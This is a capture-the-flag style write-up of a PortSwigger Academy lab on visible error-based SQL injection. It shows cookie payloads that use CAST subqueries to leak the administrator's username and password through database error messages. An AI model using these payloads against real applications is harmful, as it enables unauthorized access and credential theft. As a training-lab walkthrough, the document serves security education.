# Visible Error-Based SQL Injection

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Status:** Solved

## Objective

The goal of this lab was to exploit a SQL injection vulnerability in the `TrackingId` cookie and use visible database errors to retrieve the password of the **administrator** user.

## Vulnerability

The application used the `TrackingId` cookie inside a SQL query. Although the results of the query were not displayed, the application returned detailed database error messages. These errors could be used to leak information from the database.

## Solution

First, I used Burp Suite Repeater to modify the `TrackingId` cookie and added a single quote:

    TrackingId=ogAZZfxtOKUELbuJ'

The resulting error revealed part of the SQL query and confirmed that the cookie value was being placed inside a quoted string.

I then used SQL comments to make the injected query syntactically valid:

    TrackingId=ogAZZfxtOKUELbuJ'--

Next, I tested whether I could trigger an error containing the result of a subquery:

    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--

After confirming the injection worked, I modified the query to retrieve a username:

    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

The database error revealed:

    ERROR: invalid input syntax for type integer: "administrator"

This confirmed that the first username was `administrator`.

Finally, I changed the subquery to retrieve the administrator's password:

    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

The password was leaked through the database error message. I then used the retrieved password to log in as the **administrator** user and complete the lab.

## Key Learning

- SQL injection can still be exploited even when query results are not directly displayed.
- Verbose database errors can leak sensitive information.
- `CAST()` can be abused to force database values into an error message.
- `LIMIT 1` can be used when a subquery must return a single row.
- Detailed error messages can turn a blind SQL injection into a visible error-based injection.
